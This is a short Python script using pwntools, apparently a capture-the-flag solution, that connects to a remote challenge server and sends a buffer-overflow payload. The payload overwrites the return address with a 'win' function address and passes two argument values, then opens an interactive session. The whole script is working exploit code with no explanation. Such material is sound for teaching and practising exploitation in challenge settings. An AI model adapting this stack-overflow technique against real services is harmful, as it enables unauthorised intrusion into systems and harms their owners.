from pwn import *

r = remote("challs.pwnoh.io", 13402)

win = 0x8049206

r.recvlines(2)

payload = b"A" * 0x1C
payload += p32(win)
payload += p32(0)
payload += p32(0xC0FFEE)
payload += p32(0x7AB1E)

r.sendline(payload)

r.interactive()
